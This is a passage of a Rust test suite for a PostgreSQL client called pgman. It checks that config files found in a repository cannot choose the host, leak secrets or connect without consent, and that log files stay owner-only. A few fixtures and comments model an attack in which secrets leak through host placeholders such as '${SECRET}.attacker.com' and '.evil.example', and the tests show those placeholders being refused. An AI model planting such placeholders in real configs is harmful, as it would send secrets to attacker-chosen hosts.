    #[test]
    fn intellij_pick_carries_where_its_credentials_come_from() {
        let base =
            std::env::temp_dir().join(format!("pgman-main-idea-provenance-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join(".idea")).unwrap();
        std::fs::write(
            base.join(".idea/dataSources.xml"),
            "<project><component name=\"DataSourceManagerImpl\">\
             <data-source name=\"shop\" uuid=\"u1\">\
             <jdbc-url>jdbc:postgresql://svc:${PGMAN_TEST_MAIN_PROV_IPW}@db:5432/shop</jdbc-url>\
             <user-name>${PGMAN_TEST_MAIN_PROV_IU}</user-name>\
             </data-source></component></project>",
        )
        .unwrap();
        let mut picks = Vec::new();
        discover_intellij_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert_eq!(picks.len(), 1, "{picks:?}");
        assert_eq!(
            picks[0].creds,
            app::CredsProvenance::new(
                vec!["PGMAN_TEST_MAIN_PROV_IU".into()],
                vec!["PGMAN_TEST_MAIN_PROV_IPW".into()]
            )
        );
    }

    /// A discovered pick for the `batch_dsn_from_picks` tests.
    fn batch_pick(name: &str, url: &str) -> DataSourcePick {
        DataSourcePick {
            name: name.into(),
            origin: "project",
            dsn: conn::Dsn::parse(url).ok(),
            unresolved: Vec::new(),
            unresolved_host: Vec::new(),
            creds: Default::default(),
        }
    }

    #[test]
    fn batch_uses_a_single_clean_discovered_pick() {
        let got =
            batch_dsn_from_picks(vec![batch_pick("only", "postgres://app@db/main")], true).unwrap();
        assert_eq!(got.host, "db");
    }

    #[test]
    fn batch_refuses_a_lone_discovered_pick_without_the_opt_in() {
        // "Nothing discovered connects without a keypress"
        // (docs/safety-and-privacy.md) held everywhere except here:
        // `git clone && pgman --batch --sql …` inside a checkout the
        // operator hadn't read connected to whatever host that
        // checkout named. `--batch` has no keypress to offer, so the
        // deliberate act has to be a flag.
        let err = batch_dsn_from_picks(vec![batch_pick("only", "postgres://app@db/main")], false)
            .unwrap_err();
        assert!(err.contains("'only'"), "names the candidate: {err}");
        assert!(err.contains("--dsn"), "names both ways forward: {err}");
        assert!(
            err.contains("--discovered"),
            "names both ways forward: {err}"
        );
    }

    #[test]
    fn batch_refuses_a_discovered_ssh_tunnel() {
        // The TUI asks before spawning ssh; batch has nobody to ask, and
        // that is a reason to refuse, not to proceed quietly.
        let err = batch_dsn_from_picks(
            vec![batch_pick(
                "via-bastion",
                "postgres://app@db.internal:5432/main?ssh_tunnel=tom@bastion.example.com",
            )],
            true,
        )
        .unwrap_err();
        assert!(err.contains("tom@bastion.example.com"), "got: {err}");
        assert!(err.contains("--dsn"), "should name the way forward: {err}");
    }

    #[test]
    fn batch_refuses_unresolved_placeholders_and_says_which_kind() {
        let mut host = batch_pick("app", "postgres://app@db/main");
        host.unresolved_host = vec!["DB_HOST".into()];
        let err = batch_dsn_from_picks(vec![host], true).unwrap_err();
        assert!(err.starts_with("${DB_HOST} sits in the host"), "got: {err}");

        let mut user = batch_pick("app", "postgres://app@db/main");
        user.unresolved = vec!["DB_USER".into()];
        let err = batch_dsn_from_picks(vec![user], true).unwrap_err();
        assert!(err.contains("export it"), "got: {err}");

        let mut broken = batch_pick("app", "postgres://app@db/main");
        broken.dsn = None;
        let err = batch_dsn_from_picks(vec![broken], true).unwrap_err();
        assert!(err.contains("no usable connection URL"), "got: {err}");
    }

    #[test]
    fn batch_refuses_zero_or_ambiguous_candidates() {
        assert!(batch_dsn_from_picks(Vec::new(), true)
            .unwrap_err()
            .contains("no DSN"));
        let err = batch_dsn_from_picks(
            vec![
                batch_pick("a", "postgres://app@a/main"),
                batch_pick("b", "postgres://app@b/main"),
            ],
            true,
        )
        .unwrap_err();
        assert!(err.contains("--dsn to disambiguate"), "got: {err}");
    }

    #[test]
    fn apply_pgpassword_fills_an_empty_password_and_never_overwrites_one() {
        // `--dsn` is the operator's own choice of host, so PGPASSWORD
        // still applies there — it's the one place it does.
        // SAFETY: PGPASSWORD is set only by this test in this binary.
        unsafe {
            std::env::set_var("PGPASSWORD", "from-env");
        }
        let mut bare = conn::Dsn::parse("postgres://app@db/main").unwrap();
        apply_pgpassword(&mut bare);
        let mut explicit = conn::Dsn::parse("postgres://app:in-url@db/main").unwrap();
        apply_pgpassword(&mut explicit);
        unsafe {
            std::env::set_var("PGPASSWORD", "");
        }
        let mut with_empty_env = conn::Dsn::parse("postgres://app@db/main").unwrap();
        apply_pgpassword(&mut with_empty_env);
        unsafe {
            std::env::remove_var("PGPASSWORD");
        }
        let mut unset = conn::Dsn::parse("postgres://app@db/main").unwrap();
        apply_pgpassword(&mut unset);

        assert_eq!(bare.password.as_deref(), Some("from-env"));
        assert_eq!(
            explicit.password.as_deref(),
            Some("in-url"),
            "a password already in the DSN wins"
        );
        assert_eq!(with_empty_env.password, None, "empty means unset");
        assert_eq!(unset.password, None);
    }

    #[test]
    fn load_project_safety_is_none_without_a_project_file() {
        let base =
            std::env::temp_dir().join(format!("pgman-main-proj-none-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();
        // `.pgman/` is absent here, but `find_root` walks up — so this
        // only proves "None" when no ancestor has one either. The temp
        // dir is not inside a pgman checkout, so that holds.
        let got = load_project_safety(&base);
        let _ = std::fs::remove_dir_all(&base);
        assert!(got.is_none());
    }

    /// Unique-per-test scratch project dir under the OS temp dir, with
    /// `src/main/resources/application.properties` seeded from
    /// `properties_body`. Cleaned up by the caller.
    fn spring_project_with(name: &str, properties_body: &str) -> std::path::PathBuf {
        let base =
            std::env::temp_dir().join(format!("pgman-main-spring-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let resources = base.join("src/main/resources");
        std::fs::create_dir_all(&resources).unwrap();
        std::fs::write(resources.join("application.properties"), properties_body).unwrap();
        base
    }

    #[test]
    fn intellij_password_placeholder_is_marked_not_sent_as_a_literal() {
        // `.idea/dataSources.xml` is committed like every other
        // discovered file. Its `${…}` used to be copied straight into
        // the DSN, so `${PW}` went on the wire as the password.
        let base = std::env::temp_dir().join(format!("pgman-main-idea-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join(".idea")).unwrap();
        std::fs::write(
            base.join(".idea/dataSources.xml"),
            "<project><component name=\"DataSourceManagerImpl\">\
             <data-source name=\"shop\" uuid=\"u1\">\
             <jdbc-url>jdbc:postgresql://svc:${PGMAN_TEST_MAIN_IDEA_PW}@db:5432/shop</jdbc-url>\
             </data-source></component></project>",
        )
        .unwrap();
        // Deliberately not set — this is the "unresolved" case.
        let mut picks = Vec::new();
        discover_intellij_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1, "got: {picks:?}");
        assert_eq!(
            picks[0].unresolved,
            vec!["PGMAN_TEST_MAIN_IDEA_PW".to_string()],
            "the placeholder must be marked: {picks:?}"
        );
        assert!(
            picks[0]
                .name
                .contains("unresolved ${PGMAN_TEST_MAIN_IDEA_PW}"),
            "and named in the picker: {}",
            picks[0].name
        );
        assert!(
            app::dsn_placeholder_field(picks[0].dsn.as_ref()).is_some(),
            "belt and braces: the DSN itself still reads as placeholder-carrying"
        );
    }

    #[test]
    fn project_connection_password_placeholder_is_marked_not_connectable() {
        // `.pgman/pgman.toml` is committed too, and its URL used to go
        // to `Dsn::parse` unresolved — a literal `${PW}` password.
        let c = project::Connection {
            name: "dev".into(),
            url: "postgres://svc:${PGMAN_TEST_MAIN_TOML_PW}@db:5432/shop".into(),
            user: None,
            password_env: None,
            ssh_tunnel: None,
        };
        let pick = project_connection_pick(&c).expect("a marked pick, not a skip");
        assert_eq!(pick.unresolved, vec!["PGMAN_TEST_MAIN_TOML_PW".to_string()]);
        assert!(pick.name.contains("unresolved ${PGMAN_TEST_MAIN_TOML_PW}"));
        assert!(
            batch_dsn_from_picks(vec![pick], true).is_err(),
            "and batch must refuse it rather than send the literal text"
        );
    }

    #[test]
    fn project_connection_ssh_tunnel_placeholder_is_never_resolved() {
        // The tunnel target is a machine pgman runs `ssh` to — the
        // same host rule that protects the URL's host applies.
        let c = project::Connection {
            name: "bastioned".into(),
            url: "postgres://svc@db:5432/shop".into(),
            user: None,
            password_env: None,
            ssh_tunnel: Some("${PGMAN_TEST_MAIN_BASTION}.evil.example".into()),
        };
        let pick = project_connection_pick(&c).expect("a marked pick");
        assert_eq!(
            pick.unresolved_host,
            vec!["PGMAN_TEST_MAIN_BASTION".to_string()]
        );
    }

    #[test]
    fn discover_spring_datasources_never_resolves_a_host_placeholder_even_when_set() {
        // The exfiltration case: the repo chooses the domain, so
        // `${SECRET}.attacker.com` would send the value out as a DNS
        // lookup the moment we resolved it. The variable IS set here
        // and the host must still come back literal + refused.
        let base = spring_project_with(
            "resolves",
            "spring.datasource.url=jdbc:postgresql://${PGMAN_TEST_MAIN_DB_HOST_A}:5432/orders\n\
             spring.datasource.username=svc\n",
        );
        // SAFETY: unique var name, not touched by any other test.
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_DB_HOST_A", "db.internal");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_HOST_A");
        }
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert_eq!(
            picks[0].unresolved_host,
            vec!["PGMAN_TEST_MAIN_DB_HOST_A".to_string()]
        );
        assert_eq!(
            picks[0].dsn.as_ref().expect("dsn").host,
            "${PGMAN_TEST_MAIN_DB_HOST_A}",
            "the host must stay literal — the env value must not reach it"
        );
        assert!(
            picks[0]
                .name
                .contains("unresolved ${PGMAN_TEST_MAIN_DB_HOST_A}"),
            "picker label should surface it: {}",
            picks[0].name
        );
    }

    #[test]
    fn discover_spring_datasources_resolves_a_username_placeholder_from_env() {
        // The other side of the rule: username / password / dbname
        // still resolve, because those only ever reach the (literal)
        // host the config already named.
        let base = spring_project_with(
            "user",
            "spring.datasource.url=jdbc:postgresql://db.internal:5432/orders\n\
             spring.datasource.username=${PGMAN_TEST_MAIN_DB_USER_A}\n",
        );
        // SAFETY: unique var name, not touched by any other test.
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_DB_USER_A", "svc");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_USER_A");
        }
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert!(picks[0].unresolved.is_empty());
        assert!(picks[0].unresolved_host.is_empty());
        let dsn = picks[0].dsn.as_ref().expect("dsn");
        assert_eq!(dsn.user.as_deref(), Some("svc"));
        assert_eq!(dsn.host, "db.internal");
        assert!(!picks[0].name.contains("unresolved"));
    }

    #[test]
    fn discover_spring_datasources_marks_pick_when_username_placeholder_unset() {
        let base = spring_project_with(
            "unset",
            "spring.datasource.url=jdbc:postgresql://db.internal:5432/orders\n\
             spring.datasource.username=${PGMAN_TEST_MAIN_DB_USER_B}\n",
        );
        // Deliberately not set — this is the "unresolved" case.
        // SAFETY: unique var name; a stray leftover from a previous
        // run (there shouldn't be one) is removed defensively.
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_USER_B");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert_eq!(
            picks[0].unresolved,
            vec!["PGMAN_TEST_MAIN_DB_USER_B".to_string()]
        );
        assert!(picks[0].unresolved_host.is_empty());
        assert!(
            picks[0]
                .name
                .contains("unresolved ${PGMAN_TEST_MAIN_DB_USER_B}"),
            "picker label should surface the unresolved name: {}",
            picks[0].name
        );
    }

    #[test]
    fn discover_spring_datasources_marks_an_unresolved_password_and_never_sends_the_literal() {
        // The literal `${…}` text used to be stored as the password and
        // sent to the server on the wire. With no `PGPASSWORD` fallback
        // for discovered sources there is nothing else it could have
        // meant, so it marks the pick like any other placeholder.
        let base = spring_project_with(
            "pw-only",
            "spring.datasource.url=jdbc:postgresql://h:5432/orders\n\
             spring.datasource.username=svc\n\
             spring.datasource.password=${PGMAN_TEST_MAIN_DB_PW_C}\n",
        );
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_PW_C");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert_eq!(
            picks[0].unresolved,
            vec!["PGMAN_TEST_MAIN_DB_PW_C".to_string()]
        );
        assert_eq!(
            picks[0].dsn.as_ref().expect("dsn").password,
            None,
            "the literal placeholder text must never become the password"
        );
        assert!(
            picks[0]
                .name
                .contains("unresolved ${PGMAN_TEST_MAIN_DB_PW_C}"),
            "picker label should surface it: {}",
            picks[0].name
        );
    }

    #[test]
    fn discover_spring_datasources_keeps_a_pick_whose_url_wont_parse() {
        // A placeholder in the port makes `Dsn::parse` fail. The pick
        // used to be `continue`d past — it vanished from the picker with
        // no message anywhere, which reads as "pgman found nothing".
        let base = spring_project_with(
            "bad-port",
            "spring.datasource.url=jdbc:postgresql://db:${PGMAN_TEST_MAIN_DB_PORT_E}/orders\n",
        );
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_PORT_E");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1, "the pick must still be listed");
        assert!(picks[0].dsn.is_none(), "no usable DSN");
        assert_eq!(
            picks[0].unresolved_host,
            vec!["PGMAN_TEST_MAIN_DB_PORT_E".to_string()],
            "the port is part of the host component"
        );
        assert!(
            picks[0]
                .name
                .contains("unresolved ${PGMAN_TEST_MAIN_DB_PORT_E}"),
            "picker label should say why: {}",
            picks[0].name
        );
    }

    #[test]
    fn discover_spring_datasources_keeps_a_whole_url_placeholder_pick() {
        let base = spring_project_with(
            "whole-url",
            "spring.datasource.url=${PGMAN_TEST_MAIN_DB_URL_F}\n",
        );
        // Set — and still refused, because there is no host component
        // to protect: resolving it would let the file choose the host.
        // SAFETY: unique var name, not touched by any other test.
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_DB_URL_F", "jdbc:postgresql://evil/db");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_URL_F");
        }
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert!(picks[0].dsn.is_none());
        assert_eq!(
            picks[0].unresolved_host,
            vec!["PGMAN_TEST_MAIN_DB_URL_F".to_string()]
        );
    }

    #[test]
    fn discover_spring_datasources_ignores_a_non_datasource_url_property() {
        // `service.url` is a URL but not a datasource. Its `${…}` is
        // host-tainting (no `://` to protect), which used to be enough
        // to keep it — so an unrelated API endpoint showed up in the
        // connection picker as "service (application)".
        let base = spring_project_with(
            "service-url",
            "service.url=${PGMAN_TEST_MAIN_API_URL_G}\n\
             swagger.url=https://example.test/docs\n",
        );
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert!(
            picks.is_empty(),
            "neither property is a datasource: {picks:?}"
        );
    }

    #[test]
    fn discover_spring_datasources_still_skips_a_non_postgres_block() {
        // Nothing unresolved and not a Postgres URL — skipping this one
        // silently is still right.
        let base = spring_project_with(
            "mysql",
            "spring.datasource.url=jdbc:mysql://db:3306/orders\n",
        );
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert!(picks.is_empty(), "got: {picks:?}");
    }

    #[test]
    fn discover_spring_datasources_uses_a_resolved_password() {
        let base = spring_project_with(
            "pw-set",
            "spring.datasource.url=jdbc:postgresql://h:5432/orders\n\
             spring.datasource.username=svc\n\
             spring.datasource.password=${PGMAN_TEST_MAIN_DB_PW_D}\n",
        );
        // SAFETY: unique var name, not touched by any other test.
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_DB_PW_D", "s3cret");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        unsafe {
            std::env::remove_var("PGMAN_TEST_MAIN_DB_PW_D");
        }
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(picks.len(), 1);
        assert!(picks[0].unresolved.is_empty());
        assert_eq!(
            picks[0].dsn.as_ref().expect("dsn").password.as_deref(),
            Some("s3cret")
        );
    }

    #[cfg(unix)]
    #[test]
    fn chmod_owner_only_if_exists_repairs_a_preexisting_looser_log_file() {
        // Mirrors what init_logging does to a `pgman.log` that
        // predates this hardening (or was somehow created at the
        // platform-default mode by the rolling appender): it must
        // end up 0600, not just newly-created files.
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("pgman-main-log-chmod-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("pgman.log");
        std::fs::write(&path, "pre-existing log content").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();

        chmod_owner_only_if_exists(&path);

        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "log file mode was {mode:o}, want 0600");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn the_rollover_file_is_chmodded_when_the_day_changes() {
        // The reproduction: `init_logging` chmodded only at startup,
        // so the file the appender rolls to at midnight UTC took the
        // umask default and stayed there — after one day of uptime,
        // the log was world-readable again.
        use std::os::unix::fs::PermissionsExt;
        use std::sync::atomic::AtomicU64;
        let dir = std::env::temp_dir().join(format!("pgman-main-rollover-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let mode_of =
            |p: &std::path::Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;

        // Day 1: swept at startup, so this file is already correct.
        let today = dir.join("pgman.log.2026-01-01");
        std::fs::write(&today, "day one").unwrap();
        std::fs::set_permissions(&today, std::fs::Permissions::from_mode(0o600)).unwrap();
        let last_day = AtomicU64::new(20_454);

        // Same day: nothing to do, and no directory scan.
        assert!(!repair_logs_on_day_change(&dir, &last_day, 20_454));

        // Midnight. The appender creates tomorrow's file at the
        // platform default as part of the write, and the repair runs
        // after that write — so the file is there to be fixed.
        let tomorrow = dir.join("pgman.log.2026-01-02");
        std::fs::write(&tomorrow, "day two").unwrap();
        std::fs::set_permissions(&tomorrow, std::fs::Permissions::from_mode(0o644)).unwrap();

        assert!(
            repair_logs_on_day_change(&dir, &last_day, 20_455),
            "a day change must trigger the sweep"
        );
        assert_eq!(
            mode_of(&tomorrow),
            0o600,
            "the rollover file must be owner-only too"
        );
        assert_eq!(mode_of(&today), 0o600, "and the previous day stays 0600");

        // The new day is recorded, so the sweep doesn't repeat per line.
        assert!(!repair_logs_on_day_change(&dir, &last_day, 20_455));

        // A file that isn't a pgman log is left alone — the sweep
        // matches the appender's prefix, not everything in the cache
        // directory.
        let other = dir.join("update_check.json");
        std::fs::write(&other, "{}").unwrap();
        std::fs::set_permissions(&other, std::fs::Permissions::from_mode(0o644)).unwrap();
        assert!(repair_logs_on_day_change(&dir, &last_day, 20_456));
        assert_eq!(mode_of(&other), 0o644, "unrelated files are not touched");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn chmod_owner_only_if_exists_is_a_noop_for_a_missing_file() {
        // The appender-hasn't-run-yet / first-launch case: no file
        // there to chmod, and no error either.
        let dir = std::env::temp_dir().join(format!(
            "pgman-main-log-chmod-missing-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        let path = dir.join("pgman.log");
        chmod_owner_only_if_exists(&path); // must not panic
        assert!(!path.exists());
    }

    // --- format_connect_failure: connect-error + hint on stderr --------

    #[test]
    fn format_connect_failure_appends_hint_when_recognised() {
        let dsn = conn::Dsn::parse("postgres://app@nosuchhost.invalid/db").unwrap();
        let out = format_connect_failure("Connection refused (os error 61)", &dsn);
        assert!(
            out.starts_with("connect failed: Connection refused"),
            "got: {out}"
        );
        assert!(out.contains("\nhint: nothing is listening"), "got: {out}");
    }

    #[test]
    fn format_connect_failure_omits_hint_line_when_unrecognised() {
        let dsn = conn::Dsn::parse("postgres://app@host/db").unwrap();
        let out = format_connect_failure("something weird happened", &dsn);
        assert_eq!(out, "connect failed: something weird happened");
    }

    // --- resolve_dsn_arg: --dsn vs. the positional DSN ------------------

    #[test]
    fn resolve_dsn_arg_prefers_flag_when_positional_absent() {
        let cli = Cli {
            dsn: Some("postgres://a/db".into()),
            ..Default::default()
        };
        assert_eq!(
            resolve_dsn_arg(&cli).unwrap(),
            Some("postgres://a/db".to_string())
        );
    }

    #[test]
    fn resolve_dsn_arg_uses_positional_when_flag_absent() {
        let cli = Cli {
            dsn_pos: Some("postgres://a/db".into()),
            ..Default::default()
        };
        assert_eq!(
            resolve_dsn_arg(&cli).unwrap(),
            Some("postgres://a/db".to_string())
        );
    }

    #[test]
    fn resolve_dsn_arg_allows_matching_flag_and_positional() {
        let cli = Cli {
            dsn: Some("postgres://a/db".into()),
            dsn_pos: Some("postgres://a/db".into()),
            ..Default::default()
        };
        assert_eq!(
            resolve_dsn_arg(&cli).unwrap(),
            Some("postgres://a/db".to_string())
        );
    }

    #[test]
    fn resolve_dsn_arg_rejects_disagreeing_flag_and_positional() {
        let cli = Cli {
            dsn: Some("postgres://a/db".into()),
            dsn_pos: Some("postgres://b/db".into()),
            ..Default::default()
        };
        let err = resolve_dsn_arg(&cli).unwrap_err();
        assert!(err.contains("disagree"), "got: {err}");
    }

    #[test]
    fn resolve_dsn_arg_is_none_when_neither_given() {
        let cli = Cli::default();
        assert_eq!(resolve_dsn_arg(&cli).unwrap(), None);
    }

    // --- DEFAULT_SAFETY_TOML round-trips to SafetyConfig::default() ----

    #[test]
    fn default_safety_toml_round_trips_to_the_real_default() {
        let cfg: safety::SafetyConfig =
            toml::from_str(safety::DEFAULT_SAFETY_TOML).expect("DEFAULT_SAFETY_TOML must parse");
        let want = safety::SafetyConfig::default();
        assert_eq!(cfg.default.read_only, want.default.read_only);
        assert_eq!(
            cfg.default.statement_timeout_ms,
            want.default.statement_timeout_ms
        );
        assert_eq!(cfg.default.auto_tx, want.default.auto_tx);
        assert_eq!(
            cfg.default.cost_preview_threshold_rows,
            want.default.cost_preview_threshold_rows
        );
        assert_eq!(cfg.default.clean_mode, want.default.clean_mode);
        assert_eq!(cfg.default.guards.insert, want.default.guards.insert);
        assert_eq!(cfg.default.guards.update, want.default.guards.update);
        assert_eq!(
            cfg.default.guards.update_without_where,
            want.default.guards.update_without_where
        );
        assert_eq!(cfg.default.guards.delete, want.default.guards.delete);
        assert_eq!(
            cfg.default.guards.delete_without_where,
            want.default.guards.delete_without_where
        );
        assert_eq!(cfg.default.guards.truncate, want.default.guards.truncate);
        assert_eq!(cfg.default.guards.drop, want.default.guards.drop);
        assert_eq!(cfg.default.guards.ddl, want.default.guards.ddl);
        assert_eq!(cfg.default.guards.other, want.default.guards.other);
        assert!(cfg.databases.is_empty());
        assert!(want.databases.is_empty());
    }

    // --- check_log_max_size: the --log 64 MiB ceiling -------------------

    #[test]
    fn check_log_max_size_allows_the_stdin_marker() {
        assert!(check_log_max_size(std::path::Path::new("-")).is_ok());
    }

    #[test]
    fn check_log_max_size_allows_a_small_file() {
        let dir = std::env::temp_dir().join(format!("pgman-log-size-small-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("small.log");
        std::fs::write(&path, "tiny").unwrap();
        let got = check_log_max_size(&path);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(got.is_ok());
    }

    #[test]
    fn check_log_max_size_refuses_a_file_over_64mb() {
        let dir = std::env::temp_dir().join(format!("pgman-log-size-big-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("big.log");
        {
            let f = std::fs::File::create(&path).unwrap();
            f.set_len(65 * 1024 * 1024).unwrap();
        }
        let err = check_log_max_size(&path).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(err.contains("is 65 MB"), "got: {err}");
        assert!(err.contains("64 MB"), "got: {err}");
        assert!(
            err.contains("org.hibernate.SQL") || err.contains("LOG:"),
            "got: {err}"
        );
    }

    #[test]
    fn check_log_max_size_lets_a_missing_file_through() {
        // `read_log_source` produces the real not-found error; this
        // check must not shadow it with a misleading size message.
        let path =
            std::env::temp_dir().join(format!("pgman-log-size-missing-{}", std::process::id()));
        let _ = std::fs::remove_file(&path);
        assert!(check_log_max_size(&path).is_ok());
    }
}
